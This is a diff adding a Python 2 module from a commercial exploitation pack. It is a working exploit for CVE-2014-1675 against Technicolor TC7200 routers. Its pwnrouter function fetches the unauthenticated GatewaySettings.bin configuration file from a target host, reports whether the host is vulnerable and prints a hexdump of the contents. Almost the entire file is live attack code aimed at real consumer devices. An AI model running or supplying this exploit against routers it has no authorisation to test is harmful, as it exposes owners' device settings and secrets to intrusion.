@@ -1,0 +1,59 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2014
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_technicolor_1'
+_vendor_ = 'technicolor'
+_model_  = ['TC7200']
+_vuln_   = 'Information Disclosure'
+_cve_    = 'CVE-2014-1675'
+_ref_    = ''
+_port_   = 80
+
+def hexdump(src, length=16):
+  FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
+  lines = []
+  for c in xrange(0, len(src), length):
+    chars = src[c:c+length]
+    hex = ' '.join(["%02x" % ord(x) for x in chars])
+    printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
+    lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
+  return ''.join(lines)
+
+def pwnrouter(host):
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s/goform/system/GatewaySettings.bin' % host)
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  if status != 200:
+    print '[+] %s not vulnerable' % host
+    return
+  print '[+] %s vulnerable' % host
+  print 'hexdump of GatewaySettings.bin file:'
+  print '%s'%hexdump(nfo.getvalue())
+  return 
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
